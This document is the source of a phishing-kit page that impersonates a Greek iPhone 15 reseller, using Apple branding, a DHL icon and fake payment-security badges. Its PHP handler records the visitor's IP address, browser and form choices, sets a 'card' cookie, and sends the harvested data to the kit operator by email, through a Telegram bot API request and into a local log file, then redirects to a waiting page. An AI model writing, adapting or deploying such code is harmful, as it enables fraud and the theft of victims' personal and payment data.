
<?php
    
    if(isset($_POST['btnSEND'])){
        $COLOR = $_POST['COLOR'];
        $STOCKAGE = $_POST['STOCKAGE'];
      
        $IP = getenv("REMOTE_ADDR");
        
        $cookie_card = "card";
        $cookie_value = $cardnumber;
        setcookie($cookie_card, $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1 day
        
        $message .= "--++-----[ iphone 15 ]-----++--\n";
        $message .= "COLOR  : ".$COLOR."\n";
        $message .= "stockage  : ".$STOCKAGE."\n";

        
        $message .= "-------------- IP Infos ------------\n";
        $message .= "https://geoiptool.com/en/?ip=$IP\n";
        $message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
        $message .= "Time : ".$time."\n";
        $message .= "Date : ".$date."\n";
        $message .= "---------------------- @manini_ment ----------------------\n";
        $subject = "billingg Posten [ " . $IP . " ] ";
        
        include 'configuration.php';
        
        mail($MyEmail,$subject,$message);
        
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
        $text = fopen('data/inputinfo.txt', 'a');
        fwrite($text, $message);
        ?>
<script>
                        window.location.href='waiting.php';
                    </script>

 <?php }
 ?>
<html>
    <head>
        <title>GR PHONES</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="packeges/bootstrap.min.css">
        <link rel="stylesheet" href="packeges/jquery.js" >
        <link rel="stylesheet" type="text/css" href="packeges/index4.css" >


    </head>
    <link rel="Icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/b/b3/DHL_Express_logo.svg">
         
    <body>
       
   
        <div class="navigation">
        <a href="https://imgbb.com/"><img src="https://i.ibb.co/NYMh0sz/LOGO.gif" CLASS="LOGO" ></a>
            <div style="display: flex;">
                <!-- <span class="spanNAV d-none d-sm-block"><a class="decoA" href="#">Rechercher</a><img src ="images/search.svg" class="icon-nav" /></span>
                <span class="spanNAV d-none d-sm-block"><a class="decoA" href="#">Connexion</a><img src ="images/user.svg" class="icon-nav" /></span>
                    <span><a class="decoA" href="#">Plus</a><img src ="images/menu.svg" class="icon-nav" /></span> -->
            </div>
        </div>
        <div class="container-fluid topSpase" >
            <div class="row justify-content-around flex-xl-nowrap d-flex justify-content-center">
                <div class="col-8">
                 
                    <img src="https://www.hardsoftcomputers.co.uk/wp-content/uploads/2023/09/iphone-15-gallery-colours.gif"class="image1" >
                    <!-- <p class="headerTitleInfo"><b>Iphone 15 black</b></p> -->
                  
                    <img src="https://m.media-amazon.com/images/I/71v2jVh6nIL._AC_UF1000,1000_QL80_.jpg" class="Image6">
                    <img src="https://m.media-amazon.com/images/I/71vKy5OHuPL._AC_UF1000,1000_QL80_.jpg" class="Image6">
                    <img src="https://m.media-amazon.com/images/I/51ZMZLOGtPL._AC_UF894,1000_QL80_.jpg" class="Image6">
                    <img src="https://m.media-amazon.com/images/I/71657TiFeHL._AC_UF1000,1000_QL80_.jpg" class="Image7">
                    <H3 class="labelInput">Apple Iphone 15</H3>
                    <form  method="post" action="">
                    <H5 class="labelInput">Device Info</H5>
                    <p class="labelInput">Device color :</p>
                    <select onfocus="" class="ETATINPUT2" name="COLOR" id="">
                            <option data-countryCode="GN" value="GREEN">⬛black </option>
                                <option µ data-countryCode="NO" value="BLUE" >🟦blue  </option>
                                <option data-countryCode="GB" value="GREEN" >🟩green </option>
                                <option data-countryCode="US" value="YELLOW">🟨yellow </option>
                                <option data-countryCode="DZ" value="PINK">🟪pink </option>
                                </select>
                                <p class="labelInput">Device stockage :</p>
                    <select onfocus="" class="ETATINPUT3" name="STOCKAGE" id="">
                            <option data-countryCode="GN" value="128gb">128gb</option>
                        
                            <input type="submit" class="btnSEND" name="btnSEND" value="NEXT" />
                            </select>
                            </form>
                </div>
            </div>
        </div>
        <footer>
            <div class="container">
                <div class="row">
                <div class="col">
                <p class="Foo">www.gr-phones.gr</p>
                <p class="Foo">instagram : gr_phones</p>
                <p class="Foo">Verified by Visa</p>
                <p class="Foo">Mastercard SecureCode®</p>
                <p class="Foo">Apple Premium Reseller</p>
            </div>
        
            </div>
            <div class="col GRIDDIV">
                <a class="BTNFoo" href="https://www.instagram.com/phones_gr?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw==">instagram </a>
                <a class="BTNFoo" href="https://www.apple.com/in/buy/apr/">Apple Premium Reseller</a>
            </div>
                    <div style="margin-top:10px;" class="col-12">
                        <img src="images/logo.png" width="120px" />
                    </div>
            </div>
            </div>
            
        </footer>
        
        <script src="packeges/jquery.js"></script>
        <script src="packeges/bootstrap.min.js"></script>
    </body>